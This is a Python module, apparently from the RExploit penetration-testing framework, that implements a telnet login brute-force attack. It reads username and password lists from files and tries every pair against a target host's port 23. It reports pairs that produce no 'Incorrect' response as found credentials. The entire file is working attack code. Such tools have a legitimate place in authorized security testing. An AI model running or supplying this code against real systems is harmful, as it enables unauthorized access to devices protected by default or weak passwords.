from lib.interfaces.iexploit import IExploit
from modules.auxiliary.io import getContentFromFile
import telnetlib


class Exploit(IExploit):
    def __init__(self):
        super(Exploit, self).__init__(
            name="Bruteforce telnet service attack login ",
            category="bf",
            authors={
                "Daniel Diez": "RExploit module"
            },
            targets=[
                "All"
            ],
            date="11/04/2016",
            cwe="255",
            description="This a generic exploit for attack login via telnet (port 23). Test with credentials by default.",
        )

    def default(self):
        data = {"port": "23",
                "users": "users.txt",
                "passwords": "passwords.txt"}

        return data

    def run(self, data):
        port = data["port"]
        users = getContentFromFile(data["users"])
        passwords = getContentFromFile(data["passwords"])
        message = ""

        for user in users:
            for password in passwords:
                try:
                    tn = telnetlib.Telnet(self.getIP(), port)
                    tn.expect(["Login: ", "login: "], 5)
                    tn.write(user + "\r\n")
                    tn.expect(["Password: ", "password"], 5)
                    tn.write(password + "\r\n")
                    tn.write("\r\n")

                    (i, obj, res) = tn.expect(["Incorrect", "incorrect"], 5)
                    tn.close()

                    if i == -1:
                        message += "Credentials found\nUsername: {0} Password: {1}\n".format(user, password)

                    tn.close()

                except Exception:
                    pass

        if message == "":
            message = "Sorry. Credentials not found"

        return message
